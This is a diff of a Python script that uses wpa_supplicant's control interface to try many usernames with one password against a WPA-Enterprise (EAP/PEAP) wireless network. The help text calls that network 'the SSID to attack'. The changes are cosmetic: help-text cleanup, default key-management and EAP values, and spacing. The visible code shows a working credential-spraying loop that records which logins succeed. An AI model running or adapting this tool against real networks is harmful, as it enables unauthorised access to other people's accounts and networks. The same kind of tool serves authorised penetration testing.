@@ -15,14 +15,13 @@ import os
 import sys
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-i', '--interface', metavar='Interface', dest='interface', action='store', help='The Interface to use\n', required=True)
+parser.add_argument('-i', '--interface', metavar='Interface', dest='interface', action='store', help='The Interface to use', required=True)
 parser.add_argument('-s', '--ssid', metavar='SSID', dest='ssid', action='store', help='The SSID to attack', required=True)
-parser.add_argument('-U', '--User', metavar='Usernamefile', dest='usernamefile', action='store', help='Path to username file\n', required=True)
-parser.add_argument('-p', '--password', metavar='Password', dest='password', action='store', help='Password to use\n', required=True)
-parser.add_argument('-K', '--key_mgmt', metavar='Key_mgmt', dest='key_mgmt', action='store', help='Key_Management type to use\n', required=True)
-parser.add_argument('-E', '--eap_type', metavar='Eap_type', dest='eap_type', action='store', help='Eap type to use\n', required=True)
+parser.add_argument('-U', '--User', metavar='Usernamefile', dest='usernamefile', action='store', help='Path to username file', required=True)
+parser.add_argument('-p', '--password', metavar='Password', dest='password', action='store', help='Password to use', required=True)
+parser.add_argument('-K', '--key_mgmt', metavar='Key_mgmt', default='WPA-EAP', dest='key_mgmt', action='store', help='Key_Management type to use')
+parser.add_argument('-E', '--eap_type', metavar='Eap_type', default='PEAP', dest='eap_type', action='store', help='Eap type to use')
 args = parser.parse_args()
-
 
 
 wpas_ctrl = '/var/run/wpa_supplicant'
@@ -85,19 +84,19 @@ def main():
 			sys.stdout.write ('Trying Username ' + username.rstrip(os.linesep) + ' with Password ' + password + ': ')
 			wpa.request('LOGON')
 			time.sleep(4)
-			count= 0
+			count = 0
 			while count < 10:
-				count +=1
+				count += 1
 				time.sleep(1)
 				while wpa.pending():
 					resp = wpa.recv()
 					if 'CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully' in  resp:
 						print success
-						count=10
+						count = 10
 						break
 					if 'CTRL-EVENT-EAP-FAILURE EAP authentication failed' in resp:
 						print failed 
-						count=10
+						count = 10
 						break
 			wpa.request('DISABLE_NETWORK 0')
 			time.sleep(2)
